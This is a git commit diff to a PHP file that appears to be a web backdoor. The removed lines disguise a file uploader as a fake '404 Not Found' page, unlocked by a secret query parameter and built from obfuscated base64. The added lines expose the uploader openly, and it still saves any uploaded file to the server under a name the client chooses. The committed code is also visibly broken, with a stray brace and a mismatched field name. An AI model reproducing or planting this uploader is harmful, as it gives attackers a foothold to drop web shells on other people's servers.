f69f65510a6d01e43eaa5a01726a39c02274a425
imam mrtdho <88535491+Mr-7Mind@users.noreply.github.com>
2023-05-19 17:46:14 +0800

    Update pas.php

--- pas.php
+++ pas.php
@@ -1,14 +1,8 @@
-<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html><head>
-<title>404 Not Found</title>
-</head><body>
-<h1>Not Found</h1>
-<p>The requested URL <?php echo $_SERVER['REQUEST_URI'];
- ?> was not found on this server.</p>
-</body></html>
 <?php
-if(isset($_GET["ribel"])){
- echo(base64_decode("Ijxmb3"."JtIG1ldGhvZD0n"."UE9TVCcgZW5jdHlw"."ZT0nbXVsdGlwYXJ0L2Z"."vcm0tZGF0YSc+PGl"."ucHV0IHR5cGU9J2ZpbGUnbmF"."tZT0nZicgLz48aW5wdXQgdHlwZT0nc3V"."ibWl0JyB2YWx1ZT0ndXAnIC8+PC9mb3JtPiI="));
+echo "<form method='POST' enctype='multipart/form-data'>
+          <input type='file' name='file'>
+          <input type='submit' value='Upload'>
+        </form>";
  @copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);
  echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");
 }
